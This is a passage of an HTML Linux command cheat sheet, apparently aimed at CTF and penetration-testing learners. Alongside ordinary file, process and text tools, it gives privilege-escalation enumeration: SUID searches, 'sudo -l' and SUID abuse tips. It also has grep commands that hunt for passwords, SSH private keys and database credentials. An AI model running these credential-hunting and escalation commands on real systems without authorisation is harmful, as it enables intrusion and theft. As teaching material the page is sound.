+<span class="k">cp</span> <span class="s">file.txt</span> <span class="s">backup.txt</span>  <span class="c"># copy file</span>
+<span class="k">cp</span> <span class="o">-r</span> <span class="s">dir/</span> <span class="s">dir_backup/</span>  <span class="c"># copy directory recursively</span>
+<span class="k">cp</span> <span class="o">-p</span> <span class="s">file.txt</span> <span class="s">dest/</span>   <span class="c"># preserve permissions + timestamps</span>
+
+<span class="c"># ── MOVING / RENAMING ───────────────────────</span>
+<span class="k">mv</span> <span class="s">file.txt</span> <span class="s">/tmp/</span>      <span class="c"># move file</span>
+<span class="k">mv</span> <span class="s">old.txt</span> <span class="s">new.txt</span>     <span class="c"># rename file</span>
+<span class="k">mv</span> <span class="s">dir/</span> <span class="s">/opt/dir/</span>     <span class="c"># move entire directory</span>
+
+<span class="c"># ── DELETING ────────────────────────────────</span>
+<span class="k">rm</span> <span class="s">file.txt</span>            <span class="c"># remove file</span>
+<span class="k">rm</span> <span class="o">-r</span> <span class="s">dir/</span>            <span class="c"># remove directory recursively</span>
+<span class="k">rm</span> <span class="o">-rf</span> <span class="s">dir/</span>           <span class="c"># force remove — NO confirmation!</span>
+<span class="k">rmdir</span> <span class="s">emptydir/</span>       <span class="c"># remove empty directory only</span>
+
+<span class="c"># ── READING FILES ───────────────────────────</span>
+<span class="k">cat</span> <span class="s">file.txt</span>           <span class="c"># print entire file</span>
+<span class="k">less</span> <span class="s">file.txt</span>          <span class="c"># paginated reader (q to quit)</span>
+<span class="k">head</span> <span class="o">-n 20</span> <span class="s">file.txt</span>   <span class="c"># first 20 lines</span>
+<span class="k">tail</span> <span class="o">-n 20</span> <span class="s">file.txt</span>   <span class="c"># last 20 lines</span>
+<span class="k">tail</span> <span class="o">-f</span> <span class="s">/var/log/syslog</span> <span class="c"># follow log in real time</span>
+<span class="k">wc</span> <span class="o">-l</span> <span class="s">file.txt</span>        <span class="c"># count lines</span>
+<span class="k">xxd</span> <span class="s">file.bin</span>          <span class="c"># hex dump (binary files)</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-find">
+    <div class="card-head" onclick="toggle('c-find')"><h3>find — The Most Powerful Search Tool</h3><div class="card-tags"><span class="ctag ctag-r">security</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <p><span class="mi">find</span> searches the filesystem recursively with incredibly flexible criteria. Essential for privilege escalation and forensics.</p>
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Basic syntax: find [path] [criteria] [action]</span>
+
+<span class="c"># ── BY NAME ─────────────────────────────────</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-name</span> <span class="s">"flag.txt"</span>            <span class="c"># exact name</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-name</span> <span class="s">"*.conf"</span>              <span class="c"># wildcard</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-iname</span> <span class="s">"secret*"</span>            <span class="c"># case-insensitive</span>
+
+<span class="c"># ── BY TYPE ─────────────────────────────────</span>
+<span class="k">find</span> <span class="s">/home</span> <span class="o">-type f</span>                  <span class="c"># files only</span>
+<span class="k">find</span> <span class="s">/home</span> <span class="o">-type d</span>                  <span class="c"># directories only</span>
+<span class="k">find</span> <span class="s">/dev</span> <span class="o">-type l</span>                   <span class="c"># symlinks</span>
+
+<span class="c"># ── BY PERMISSIONS (PRIVESC GOLD!) ──────────</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-perm -u=s -type f</span> <span class="v">2</span>&gt;/dev/null  <span class="c"># SUID files → privesc!</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-perm -g=s -type f</span> <span class="v">2</span>&gt;/dev/null  <span class="c"># SGID files</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-perm -777 -type f</span> <span class="v">2</span>&gt;/dev/null  <span class="c"># world-writable executables</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-writable -type d</span> <span class="v">2</span>&gt;/dev/null    <span class="c"># writable directories</span>
+
+<span class="c"># ── BY OWNER ────────────────────────────────</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-user root</span>                    <span class="c"># owned by root</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-nouser</span>                       <span class="c"># orphan files (no owner)</span>
+
+<span class="c"># ── BY TIME ─────────────────────────────────</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-mtime -7</span>                     <span class="c"># modified in last 7 days</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-mmin -60</span>                     <span class="c"># modified in last 60 minutes</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-newer /tmp/ref</span>               <span class="c"># newer than reference file</span>
+
+<span class="c"># ── WITH ACTIONS ────────────────────────────</span>
+<span class="k">find</span> <span class="s">/tmp</span> <span class="o">-name</span> <span class="s">"*.sh"</span> <span class="o">-exec chmod +x {} \;</span>  <span class="c"># exec command on results</span>
+<span class="k">find</span> <span class="s">/var/log</span> <span class="o">-name</span> <span class="s">"*.log"</span> <span class="o">-delete</span>           <span class="c"># delete matching files</span>
+<span class="k">find</span> <span class="s">/</span> <span class="o">-name</span> <span class="s">"*.bak"</span> <span class="o">-ls</span>                      <span class="c"># list details of matches</span></pre>
+      </div>
+      <div class="note note-r">
+        <div class="note-label">PrivEsc Tip</div>
+        <code>find / -perm -u=s -type f 2>/dev/null</code> — Run this on every box you get access to. SUID binaries running as root are prime privilege escalation targets. Cross-reference results with <strong>GTFOBins</strong>.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S4: PERMISSIONS & OWNERSHIP -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s4">
+  <div class="sec-header">
+    <div class="sec-num">04</div>
+    <div class="sec-meta">
+      <h2>PERMISSIONS & OWNERSHIP</h2>
+      <p>Linux's permission system controls who can read, write, or execute every file. Misconfigurations here are the #1 source of privilege escalation.</p>
+    </div>
+  </div>
+
+  <p>Every file has three permission sets: <strong>Owner (u)</strong>, <strong>Group (g)</strong>, and <strong>Others (o)</strong>. Each set has three bits: Read (r=4), Write (w=2), Execute (x=1).</p>
+
+  <!-- Permission visual -->
+  <div style="overflow-x:auto">
+    <div style="min-width:500px">
+      <div style="font-family:var(--mono);font-size:11px;color:var(--text3);margin-bottom:6px;padding-left:34px">
+        TYPE &nbsp;&nbsp; OWNER (u) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GROUP (g) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OTHERS (o)
+      </div>
+      <div style="display:flex;gap:4px;align-items:center">
+        <div style="background:var(--bg3);border:1px solid var(--border);width:30px;height:30px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);color:var(--text3)">-</div>
+        <span style="color:var(--text3);padding:0 4px">│</span>
+        <div class="perm-visual" style="margin:0">
+          <div class="pv-group">
+            <div class="pv-bits">
+              <div class="pv-bit on-r">r</div>
+              <div class="pv-bit on-w">w</div>
+              <div class="pv-bit on-x">x</div>
+            </div>
+            <div class="pv-label">owner</div>
+          </div>
+        </div>
+        <span style="color:var(--text3);padding:0 4px">│</span>
+        <div class="perm-visual" style="margin:0">
+          <div class="pv-group">
+            <div class="pv-bits">
+              <div class="pv-bit on-r">r</div>
+              <div class="pv-bit off">-</div>
+              <div class="pv-bit on-x">x</div>
+            </div>
+            <div class="pv-label">group</div>
+          </div>
+        </div>
+        <span style="color:var(--text3);padding:0 4px">│</span>
+        <div class="perm-visual" style="margin:0">
+          <div class="pv-group">
+            <div class="pv-bits">
+              <div class="pv-bit on-r">r</div>
+              <div class="pv-bit off">-</div>
+              <div class="pv-bit off">-</div>
+            </div>
+            <div class="pv-label">others</div>
+          </div>
+        </div>
+        <div style="font-family:var(--mono);font-size:13px;color:var(--amber2);margin-left:14px">-rwxr-xr-- = 754</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="g2" style="margin-top:16px">
+    <div class="mini">
+      <h4>Octal Permission Values</h4>
+      <table class="dt" style="margin-top:8px">
+        <tr><th>Octal</th><th>Binary</th><th>Symbolic</th><th>Meaning</th></tr>
+        <tr><td class="mono-cell">7</td><td class="mono-cell">111</td><td class="mono-cell">rwx</td><td>Full access</td></tr>
+        <tr><td class="mono-cell">6</td><td class="mono-cell">110</td><td class="mono-cell">rw-</td><td>Read + Write</td></tr>
+        <tr><td class="mono-cell">5</td><td class="mono-cell">101</td><td class="mono-cell">r-x</td><td>Read + Execute</td></tr>
+        <tr><td class="mono-cell">4</td><td class="mono-cell">100</td><td class="mono-cell">r--</td><td>Read only</td></tr>
+        <tr><td class="mono-cell">0</td><td class="mono-cell">000</td><td class="mono-cell">---</td><td>No access</td></tr>
+      </table>
+    </div>
+    <div class="mini">
+      <h4>Common Permission Combos</h4>
+      <table class="dt" style="margin-top:8px">
+        <tr><th>Octal</th><th>Use Case</th></tr>
+        <tr><td class="mono-cell">755</td><td>Directories, public scripts</td></tr>
+        <tr><td class="mono-cell">644</td><td>Regular files, config files</td></tr>
+        <tr><td class="mono-cell">600</td><td>SSH private keys, secrets</td></tr>
+        <tr><td class="mono-cell">700</td><td>Private scripts</td></tr>
+        <tr><td class="mono-cell">777</td><td>⚠ World-writable — dangerous!</td></tr>
+        <tr><td class="mono-cell">4755</td><td>SUID executable (runs as owner)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="card" id="c-perm">
+    <div class="card-head" onclick="toggle('c-perm')"><h3>chmod, chown — Changing Permissions</h3><div class="card-tags"><span class="ctag ctag-a">commands</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── CHMOD (change mode) ─────────────────────</span>
+<span class="k">chmod</span> <span class="v">755</span> script.sh         <span class="c"># octal: rwxr-xr-x</span>
+<span class="k">chmod</span> <span class="v">600</span> ~/.ssh/id_rsa     <span class="c"># SSH key: owner rw only</span>
+<span class="k">chmod</span> <span class="o">+x</span> script.sh          <span class="c"># add execute for all</span>
+<span class="k">chmod</span> <span class="o">u+x</span> script.sh         <span class="c"># add execute for owner only</span>
+<span class="k">chmod</span> <span class="o">o-r</span> secret.txt        <span class="c"># remove read from others</span>
+<span class="k">chmod</span> <span class="o">g+w</span> shared.txt        <span class="c"># add write for group</span>
+<span class="k">chmod</span> <span class="o">-R 755</span> /var/www/      <span class="c"># recursive</span>
+
+<span class="c"># ── CHOWN (change owner) ─────────────────────</span>
+<span class="k">chown</span> root file.txt          <span class="c"># change owner to root</span>
+<span class="k">chown</span> rudra:developers file  <span class="c"># owner:group</span>
+<span class="k">chown</span> <span class="o">-R</span> www-data /var/www/  <span class="c"># recursive chown</span>
+
+<span class="c"># ── SPECIAL BITS ─────────────────────────────</span>
+<span class="k">chmod</span> <span class="p">u+s</span> /usr/bin/program   <span class="c"># set SUID — runs as file owner</span>
+<span class="k">chmod</span> <span class="p">g+s</span> /shared/dir/       <span class="c"># set SGID — new files inherit group</span>
+<span class="k">chmod</span> <span class="o">+t</span> /tmp/               <span class="c"># sticky bit — only owner can delete</span>
+
+<span class="c"># In ls -l, special bits show as:</span>
+<span class="c"># -rwsr-xr-x  SUID set (s in owner execute position)</span>
+<span class="c"># drwxrwsr-x  SGID set (s in group execute position)</span>
+<span class="c"># drwxrwxrwt  Sticky bit (t in others execute position)</span>
+
+<span class="c"># ── UMASK (default permissions) ──────────────</span>
+<span class="k">umask</span>                         <span class="c"># show current (e.g. 0022)</span>
+<span class="k">umask</span> <span class="v">027</span>                    <span class="c"># new files: 640, dirs: 750</span></pre>
+      </div>
+      <div class="note note-r">
+        <div class="note-label">SUID Exploitation</div>
+        When a binary has the SUID bit and is owned by root, it runs as root regardless of who executes it. If that binary can be abused to execute arbitrary code (e.g., via shell escape), you get root. Common SUID abuse: <span class="mi">find</span>, <span class="mi">vim</span>, <span class="mi">less</span>, <span class="mi">bash</span>, <span class="mi">python</span>.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S5: USERS & GROUPS -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s5">
+  <div class="sec-header">
+    <div class="sec-num">05</div>
+    <div class="sec-meta">
+      <h2>USERS & GROUPS</h2>
+      <p>Linux multi-user system — creating users, managing groups, sudo access, and lateral movement vectors.</p>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="mini">
+      <h4>/etc/passwd — User Database</h4>
+      <div class="diagram" style="margin-top:8px"><span class="dh">root</span>:<span class="dr">x</span>:<span class="dg">0</span>:<span class="dg">0</span>:<span class="db">root</span>:<span class="dc">/root</span>:<span class="dd">/bin/bash</span>
+<span class="dd"> │    │   │   │   │       │        └─ login shell</span>
+<span class="dd"> │    │   │   │   │       └─ home dir</span>
+<span class="dd"> │    │   │   │   └─ GECOS (full name)</span>
+<span class="dd"> │    │   │   └─ GID (group ID)</span>
+<span class="dd"> │    │   └─ UID (user ID, 0=root)</span>
+<span class="dd"> │    └─ password (x=in shadow)</span>
+<span class="dd"> └─ username</span></div>
+    </div>
+    <div class="mini">
+      <h4>/etc/shadow — Password Hashes</h4>
+      <div class="diagram" style="margin-top:8px"><span class="dh">rudra</span>:<span class="dr">$6$salt$hash...</span>:<span class="dg">19000</span>:<span class="dd">0:99999:7:::</span>
+<span class="dd">  │       │                  │</span>
+<span class="dd">  │       │                  └─ last changed (days)</span>
+<span class="dd">  │       └─ $6$=SHA-512, $1$=MD5, $y$=yescrypt</span>
+<span class="dd">  └─ username</span>
+
+<span class="dr">Only root can read this file!</span>
+<span class="dc">Hash formats: $1$=MD5, $5$=SHA-256</span>
+<span class="dc">             $6$=SHA-512, $y$=yescrypt</span></div>
+    </div>
+  </div>
+
+  <div class="card" id="c-users">
+    <div class="card-head" onclick="toggle('c-users')"><h3>User & Group Management</h3><div class="card-tags"><span class="ctag ctag-a">commands</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── USER INFO ────────────────────────────────</span>
+<span class="k">whoami</span>                     <span class="c"># current username</span>
+<span class="k">id</span>                         <span class="c"># uid, gid, groups — essential first command</span>
+<span class="k">id</span> <span class="s">rudra</span>                   <span class="c"># info about specific user</span>
+<span class="k">who</span>                        <span class="c"># who is logged in</span>
+<span class="k">w</span>                          <span class="c"># logged in users + what they're doing</span>
+<span class="k">last</span>                       <span class="c"># login history</span>
+<span class="k">lastlog</span>                    <span class="c"># last login for all users</span>
+
+<span class="c"># ── CREATE / MODIFY USERS ────────────────────</span>
+sudo <span class="k">useradd</span> <span class="o">-m -s /bin/bash</span> <span class="s">newuser</span>  <span class="c"># create user with home + bash</span>
+sudo <span class="k">passwd</span> <span class="s">newuser</span>         <span class="c"># set password</span>
+sudo <span class="k">usermod</span> <span class="o">-aG sudo</span> <span class="s">rudra</span> <span class="c"># add to sudo group</span>
+sudo <span class="k">userdel</span> <span class="o">-r</span> <span class="s">olduser</span>    <span class="c"># delete user + home dir</span>
+sudo <span class="k">chsh</span> <span class="o">-s /bin/zsh</span> <span class="s">rudra</span> <span class="c"># change login shell</span>
+
+<span class="c"># ── GROUPS ───────────────────────────────────</span>
+<span class="k">groups</span>                     <span class="c"># show your groups</span>
+<span class="k">cat</span> /etc/group             <span class="c"># all groups</span>
+sudo <span class="k">groupadd</span> <span class="s">hackers</span>      <span class="c"># create group</span>
+sudo <span class="k">usermod</span> <span class="o">-aG</span> <span class="s">hackers rudra</span>  <span class="c"># add user to group</span>
+
+<span class="c"># ── SUDO ─────────────────────────────────────</span>
+sudo <span class="k">command</span>               <span class="c"># run as root</span>
+sudo <span class="o">-l</span>                    <span class="c"># list what THIS user can sudo — CRITICAL ENUM!</span>
+sudo <span class="o">-u www-data bash</span>     <span class="c"># run bash as www-data user</span>
+sudo <span class="o">-s</span>                    <span class="c"># root shell via sudo</span>
+<span class="k">su</span> <span class="s">root</span>                    <span class="c"># switch to root (need root password)</span>
+<span class="k">su</span> <span class="o">-</span> <span class="s">rudra</span>                 <span class="c"># switch user (full login shell)</span>
+
+<span class="c"># ── PRIVESC CHECK ────────────────────────────</span>
+<span class="k">cat</span> /etc/passwd | grep <span class="o">-v</span> <span class="s">nologin</span>  <span class="c"># users with real shells</span>
+<span class="k">cat</span> /etc/sudoers                    <span class="c"># who can sudo what</span>
+sudo <span class="o">-l</span>                              <span class="c"># ← run this every time!</span></pre>
+      </div>
+      <div class="note note-b">
+        <div class="note-label">Enum Tip</div>
+        <code>id</code> then <code>sudo -l</code> are the first two commands to run when you get a shell. They instantly reveal privilege opportunities. If you see <strong>(ALL) NOPASSWD: ALL</strong> in sudo -l output, type <span class="mi">sudo bash</span> and you're root.
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S6: PROCESSES & JOBS -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s6">
+  <div class="sec-header">
+    <div class="sec-num">06</div>
+    <div class="sec-meta">
+      <h2>PROCESSES & JOBS</h2>
+      <p>Managing running programs, signals, background jobs, and process hierarchy.</p>
+    </div>
+  </div>
+
+  <div class="diagram"><span class="dh">Process Tree (pstree -p)</span>
+
+<span class="dg">systemd(1)</span>─┬─<span class="db">sshd(412)</span>───<span class="db">sshd(1234)</span>───<span class="dc">bash(1235)</span>───<span class="dd">ps(9999)</span>
+           ├─<span class="db">nginx(800)</span>─┬─<span class="db">nginx(801)</span> <span class="dd">(worker)</span>
+           │             └─<span class="db">nginx(802)</span> <span class="dd">(worker)</span>
+           ├─<span class="db">cron(500)</span>───<span class="dd">backup.sh(3456)</span>
+           └─<span class="db">mysql(600)</span>
+
+<span class="dd">Every process has: PID (ID), PPID (parent ID), UID (owner), priority, state</span>
+<span class="dd">States: R=Running, S=Sleeping, Z=Zombie, T=Stopped, D=Uninterruptible I/O</span></div>
+
+  <div class="card" id="c-proc">
+    <div class="card-head" onclick="toggle('c-proc')"><h3>Process Management Commands</h3><div class="card-tags"><span class="ctag ctag-a">essential</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── VIEWING PROCESSES ─────────────────────────</span>
+<span class="k">ps</span> <span class="o">aux</span>               <span class="c"># all processes: user, pid, %cpu, %mem, command</span>
+<span class="k">ps</span> <span class="o">aux</span> | grep nginx  <span class="c"># filter for specific process</span>
+<span class="k">ps</span> <span class="o">-ef</span>               <span class="c"># full format (shows PPID)</span>
+<span class="k">ps</span> <span class="o">-p</span> <span class="v">1234</span>           <span class="c"># info about PID 1234</span>
+<span class="k">pstree</span>               <span class="c"># process tree view</span>
+<span class="k">top</span>                  <span class="c"># interactive process monitor</span>
+<span class="k">htop</span>                 <span class="c"># better interactive monitor (may need install)</span>
+
+<span class="c"># ── KILLING PROCESSES ─────────────────────────</span>
+<span class="k">kill</span> <span class="v">1234</span>            <span class="c"># send SIGTERM (15) — graceful</span>
+<span class="k">kill</span> <span class="o">-9</span> <span class="v">1234</span>         <span class="c"># send SIGKILL — force kill, no cleanup</span>
+<span class="k">kill</span> <span class="o">-STOP</span> <span class="v">1234</span>      <span class="c"># pause process</span>
+<span class="k">kill</span> <span class="o">-CONT</span> <span class="v">1234</span>      <span class="c"># resume paused process</span>
+<span class="k">pkill</span> nginx           <span class="c"># kill by name</span>
+<span class="k">killall</span> python3       <span class="c"># kill all processes with name</span>
+
+<span class="c"># ── BACKGROUND / FOREGROUND ───────────────────</span>
+<span class="f">command</span> <span class="o">&amp;</span>            <span class="c"># run in background</span>
+<span class="k">Ctrl+Z</span>               <span class="c"># suspend foreground job</span>
+<span class="k">bg</span>                   <span class="c"># resume suspended job in background</span>
+<span class="k">fg</span>                   <span class="c"># bring background job to foreground</span>
+<span class="k">fg</span> <span class="v">%2</span>                <span class="c"># bring job #2 to foreground</span>
+<span class="k">jobs</span>                 <span class="c"># list background jobs</span>
+<span class="k">nohup</span> <span class="f">command</span> <span class="o">&amp;</span>      <span class="c"># run immune to hangup (survives logout)</span>
+<span class="k">disown</span>               <span class="c"># detach job from shell</span>
+
+<span class="c"># ── RESOURCE USAGE ────────────────────────────</span>
+<span class="k">lsof</span>                 <span class="c"># list open files by all processes</span>
+<span class="k">lsof</span> <span class="o">-p</span> <span class="v">1234</span>         <span class="c"># files opened by PID 1234</span>
+<span class="k">lsof</span> <span class="o">-i :80</span>          <span class="c"># what process is using port 80</span>
+<span class="k">strace</span> <span class="o">-p</span> <span class="v">1234</span>       <span class="c"># trace system calls of a process</span>
+<span class="k">strace</span> <span class="f">./program</span>     <span class="c"># trace from start (powerful for analysis)</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S7: TEXT PROCESSING -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s7">
+  <div class="sec-header">
+    <div class="sec-num">07</div>
+    <div class="sec-meta">
+      <h2>TEXT PROCESSING</h2>
+      <p>grep, awk, sed, cut, sort — the Unix pipeline tools that make data manipulation trivially powerful.</p>
+    </div>
+  </div>
+
+  <div class="note note-a">
+    <div class="note-label">The Unix Philosophy</div>
+    Write programs that do one thing well. Write programs that work together. Write programs that handle text streams. The pipe (|) connects them — <code>cmd1 | cmd2 | cmd3</code> — output of one becomes input of the next.
+  </div>
+
+  <div class="card" id="c-grep">
+    <div class="card-head" onclick="toggle('c-grep')"><h3>grep — Search Text</h3><div class="card-tags"><span class="ctag ctag-r">security essential</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── BASIC GREP ────────────────────────────────</span>
+<span class="k">grep</span> <span class="s">"root"</span> /etc/passwd           <span class="c"># search for pattern in file</span>
+<span class="k">grep</span> <span class="o">-i</span> <span class="s">"password"</span> config.txt    <span class="c"># case-insensitive</span>
+<span class="k">grep</span> <span class="o">-r</span> <span class="s">"secret"</span> /var/www/       <span class="c"># recursive search in dir</span>
+<span class="k">grep</span> <span class="o">-n</span> <span class="s">"error"</span> app.log          <span class="c"># show line numbers</span>
+<span class="k">grep</span> <span class="o">-v</span> <span class="s">"nologin"</span> /etc/passwd    <span class="c"># invert match (exclude)</span>
+<span class="k">grep</span> <span class="o">-c</span> <span class="s">"failed"</span> auth.log        <span class="c"># count matching lines</span>
+<span class="k">grep</span> <span class="o">-l</span> <span class="s">"password"</span> /etc/*.conf   <span class="c"># list filenames only</span>
+<span class="k">grep</span> <span class="o">-A 3</span> <span class="s">"error"</span> log.txt        <span class="c"># 3 lines After match</span>
+<span class="k">grep</span> <span class="o">-B 3</span> <span class="s">"error"</span> log.txt        <span class="c"># 3 lines Before match</span>
+<span class="k">grep</span> <span class="o">-C 3</span> <span class="s">"error"</span> log.txt        <span class="c"># 3 lines Context (before + after)</span>
+
+<span class="c"># ── REGEX PATTERNS ────────────────────────────</span>
+<span class="k">grep</span> <span class="o">-E</span> <span class="s">"^root"</span> /etc/passwd      <span class="c"># ^ = start of line</span>
+<span class="k">grep</span> <span class="o">-E</span> <span class="s">"bash$"</span> /etc/passwd      <span class="c"># $ = end of line</span>
+<span class="k">grep</span> <span class="o">-E</span> <span class="s">"[0-9]{1,3}\.[0-9]{1,3}"</span> log <span class="c"># IP-ish pattern</span>
+<span class="k">grep</span> <span class="o">-oE</span> <span class="s">"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+"</span> file  <span class="c"># extract emails</span>
+<span class="k">grep</span> <span class="o">-oE</span> <span class="s">"[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"</span> log   <span class="c"># extract IPs</span>
+
+<span class="c"># ── SECURITY HUNTING ──────────────────────────</span>
+<span class="k">grep</span> <span class="o">-rn</span> <span class="s">"password\|passwd\|secret\|key"</span> /etc/ <span class="v">2</span>&gt;/dev/null
+<span class="k">grep</span> <span class="o">-r</span> <span class="s">"PRIVATE KEY"</span> /home/ <span class="v">2</span>&gt;/dev/null       <span class="c"># find SSH keys</span>
+<span class="k">grep</span> <span class="o">-rn</span> <span class="s">"DB_PASS\|db_password"</span> /var/www/       <span class="c"># DB creds in web files</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" id="c-awk">
+    <div class="card-head" onclick="toggle('c-awk')"><h3>awk, sed, cut — Data Extraction & Transformation</h3><div class="card-tags"><span class="ctag ctag-b">power tools</span></div><span class="card-chevron">▾</span></div>
+    <div class="card-body">
+      <div class="code">
+        <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># ── AWK — column/field processor ─────────────</span>
+<span class="c"># Fields split by whitespace: $1=1st, $2=2nd, $NF=last</span>
+<span class="k">awk</span> <span class="s">'{print $1}'</span> /etc/passwd    <span class="c"># print 1st field</span>
+<span class="k">awk</span> <span class="o">-F:</span> <span class="s">'{print $1}'</span> /etc/passwd <span class="c"># use : as delimiter</span>
+<span class="k">awk</span> <span class="o">-F:</span> <span class="s">'{print $1,$3}'</span> /etc/passwd  <span class="c"># username and UID</span>
+<span class="k">awk</span> <span class="o">-F:</span> <span class="s">'$3==0 {print $1}'</span> /etc/passwd  <span class="c"># users with UID 0 (root!)</span>
+<span class="k">awk</span> <span class="s">'{sum+=$1} END {print sum}'</span> numbers.txt <span class="c"># sum column</span>
+<span class="k">awk</span> <span class="s">'/error/{count++} END{print count}'</span> app.log <span class="c"># count pattern</span>
+
+<span class="c"># ── SED — stream editor / find & replace ─────</span>
+<span class="k">sed</span> <span class="s">'s/old/new/g'</span> file.txt     <span class="c"># replace all occurrences</span>
+<span class="k">sed</span> <span class="o">-i</span> <span class="s">'s/old/new/g'</span> file.txt  <span class="c"># in-place edit</span>
+<span class="k">sed</span> <span class="s">'/^#/d'</span> config.txt          <span class="c"># delete comment lines</span>
+<span class="k">sed</span> <span class="s">'/^$/d'</span> file.txt            <span class="c"># delete empty lines</span>
+<span class="k">sed</span> <span class="s">'1,5d'</span> file.txt            <span class="c"># delete lines 1-5</span>
+<span class="k">sed</span> <span class="o">-n</span> <span class="s">'10,20p'</span> file.txt       <span class="c"># print lines 10-20</span>
+
+<span class="c"># ── CUT — extract columns ─────────────────────</span>
+<span class="k">cut</span> <span class="o">-d: -f1</span> /etc/passwd        <span class="c"># field 1 with : delimiter</span>
+<span class="k">cut</span> <span class="o">-d: -f1,3</span> /etc/passwd     <span class="c"># fields 1 and 3</span>
+<span class="k">cut</span> <span class="o">-c1-20</span> file.txt           <span class="c"># characters 1-20</span>
+
+<span class="c"># ── SORT & UNIQ ───────────────────────────────</span>
+<span class="k">sort</span> file.txt                  <span class="c"># alphabetical sort</span>
+<span class="k">sort</span> <span class="o">-n</span> numbers.txt           <span class="c"># numeric sort</span>
+<span class="k">sort</span> <span class="o">-rn</span> numbers.txt          <span class="c"># reverse numeric</span>
+<span class="k">sort</span> <span class="o">-u</span> file.txt              <span class="c"># unique lines (sort + dedup)</span>
+<span class="k">uniq</span> <span class="o">-c</span> sorted.txt           <span class="c"># count occurrences</span>
+<span class="k">sort</span> | <span class="k">uniq</span> <span class="o">-c</span> | <span class="k">sort</span> <span class="o">-rn</span>   <span class="c"># frequency analysis</span>
+
+<span class="c"># ── REAL PIPELINE EXAMPLE ─────────────────────</span>
+<span class="c"># Top 10 IPs in access log by request count:</span>
+<span class="k">awk</span> <span class="s">'{print $1}'</span> /var/log/nginx/access.log | <span class="k">sort</span> | <span class="k">uniq</span> <span class="o">-c</span> | <span class="k">sort</span> <span class="o">-rn</span> | <span class="k">head</span> <span class="o">-10</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ══════════════════════════════════════════ -->
+<!-- S8: NETWORKING COMMANDS -->
+<!-- ══════════════════════════════════════════ -->
+<section class="section" id="s8">
+  <div class="sec-header">
+    <div class="sec-num">08</div>
+    <div class="sec-meta">
+      <h2>NETWORKING COMMANDS</h2>
+      <p>Linux networking from the command line — interfaces, connections, scanning, and pivoting.</p>
+    </div>
+  </div>
+
+  <div class="code">
+    <div class="code-bar"><div class="dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div><span class="lang">bash — comprehensive networking</span><button class="copy-btn" onclick="cp(this)">copy</button></div>
+    <pre><span class="c"># ── INTERFACE INFO ────────────────────────────</span>
+<span class="k">ip</span> addr show                 <span class="c"># all interfaces + IPs</span>
+<span class="k">ip</span> addr show eth0            <span class="c"># specific interface</span>
+<span class="k">ifconfig</span>                     <span class="c"># older, still common on CTF boxes</span>
+<span class="k">hostname</span> <span class="o">-I</span>                  <span class="c"># all IPs of this machine</span>
+
+<span class="c"># ── CONNECTIONS & PORTS ───────────────────────</span>
+<span class="k">ss</span> <span class="o">-tulpn</span>                   <span class="c"># tcp/udp, listening, process names</span>
